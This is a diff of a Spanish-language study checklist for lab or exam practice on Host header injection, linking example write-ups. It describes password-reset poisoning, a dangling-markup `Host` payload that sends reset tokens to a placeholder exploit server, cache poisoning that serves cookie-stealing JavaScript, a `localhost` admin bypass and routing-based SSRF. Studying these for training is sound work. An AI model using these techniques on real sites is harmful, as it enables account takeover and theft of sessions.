@@ -23,15 +23,15 @@ tags:
 
 ## 🟢 Stage 1 — foothold (tomar la cuenta de un user)
 
-- [ ] **Reset de contraseña envenenado:** pedí reset de la víctima y cambiá el `Host` → ¿el link apunta a **tu exploit-server / Collaborator**? Leé el token en el **access log** → reseteás su pass → entrás. *(Lab 2)*
+- [ ] **Reset de contraseña envenenado:** pedí reset de la víctima y cambiá el `Host` → ¿el link apunta a **tu exploit-server / Collaborator**? Leé el token en el **access log** → reseteás su pass → entrás. *(Lab 2)* → [[vulnerabilities/016-host-header-injection/examples/002-password-reset-poisoning|ej. 002]]
 - [ ] **Dangling markup:** si el `Host` está validado (conserva el dominio) pero el mail es **HTML (template)**, inyectá por el **puerto**: `Host: LAB-ID…:'><img src="//TU-EXPLOIT-SERVER/?` → el `<img>` sin cerrar se traga el token y lo exfiltra. *(Lab 3)*
-- [ ] **Cache poisoning → JS arbitrario:** si el Host se refleja en un `<script src>` **y** la respuesta se **cachea**, mandá **`Host` duplicado** (request ambigua) con el 2º apuntando a tu server → serví un JS que **robe la cookie/apiKey** de quien cargue la home. *(Lab 4 · si el que la carga es un user → S1; si es el admin → S2)* → [[exam/to-do-list/web-cache-poisoning|web cache poisoning]]
+- [ ] **Cache poisoning → JS arbitrario:** si el Host se refleja en un `<script src>` **y** la respuesta se **cachea**, mandá **`Host` duplicado** (request ambigua) con el 2º apuntando a tu server → serví un JS que **robe la cookie/apiKey** de quien cargue la home. *(Lab 4 · si el que la carga es un user → S1; si es el admin → S2)* → [[vulnerabilities/016-host-header-injection/examples/003-web-cache-poisoning-host-duplicado|ej. 003]] · [[exam/to-do-list/web-cache-poisoning|web cache poisoning]]
 - [ ] **Host → sink server-side:** ¿el Host se **guarda/loguea** o entra en una **consulta**? probá **SQLi / XSS por el header** para dumpear credenciales de un user. → [[exam/to-do-list/sql-injection|SQLi]]
 
 ## 🔴 Stage 2 — escalar a admin
 
-- [ ] **Auth bypass del panel "solo local":** `Host: localhost` (o `X-Forwarded-Host: localhost` / `127.0.0.1`) para entrar al `/admin` restringido → acciones de admin. *(Lab 1)*
-- [ ] **Routing-based SSRF a interno:** poné tu **Collaborator** en el `Host` para **confirmar**, después rutéalo al panel interno (`localhost:6566` / `192.168.0.X`) → creá admin / cambiá tu rol / borrá. *(Labs 5-6)* → [[vulnerabilities/007-ssrf/ssrf|SSRF]]
+- [ ] **Auth bypass del panel "solo local":** `Host: localhost` (o `X-Forwarded-Host: localhost` / `127.0.0.1`) para entrar al `/admin` restringido → acciones de admin. *(Lab 1)* → [[vulnerabilities/016-host-header-injection/examples/001-auth-bypass-host-localhost|ej. 001]]
+- [ ] **Routing-based SSRF a interno:** poné tu **Collaborator** en el `Host` para **confirmar**, después rutéalo al panel interno (`localhost:6566` / `192.168.0.X`) → creá admin / cambiá tu rol / borrá. *(Labs 5-6)* → [[vulnerabilities/016-host-header-injection/examples/004-routing-based-ssrf-interno|ej. 004]] · [[vulnerabilities/007-ssrf/ssrf|SSRF]]
 - [ ] **Delivered contra el admin:** la víctima activa es el **admin** → reset poisoning a **su** cuenta, o cache-poisoning con JS que roba **su** sesión (mismos trucos que S1, otra víctima).
 - [ ] **Routing cuando el `Host` está validado:** **URL absoluta** en la request line con `Host` legítimo *(Lab 6)* · **connection-state** (2 requests, 1 conexión) → [[vulnerabilities/016-host-header-injection/scripts/conn_reuse.py|conn_reuse.py]] *(Lab 7)*.
 
@@ -45,4 +45,5 @@ tags:
 ## 🔗 Referencias
 
 - entry point → [[vulnerabilities/016-host-header-injection/host-header|host-header]] · labs → [[vulnerabilities/016-host-header-injection/labs/README|labs/README]]
+- ejemplos → [[vulnerabilities/016-host-header-injection/examples/001-auth-bypass-host-localhost|001 auth bypass]] · [[vulnerabilities/016-host-header-injection/examples/002-password-reset-poisoning|002 reset poisoning]] · [[vulnerabilities/016-host-header-injection/examples/003-web-cache-poisoning-host-duplicado|003 cache poisoning]] · [[vulnerabilities/016-host-header-injection/examples/004-routing-based-ssrf-interno|004 routing SSRF]]
 - reset → [[vulnerabilities/029-authentication/authentication|Authentication]] · cache → [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|Web Cache Poisoning]] · SSRF → [[vulnerabilities/007-ssrf/ssrf|SSRF]]
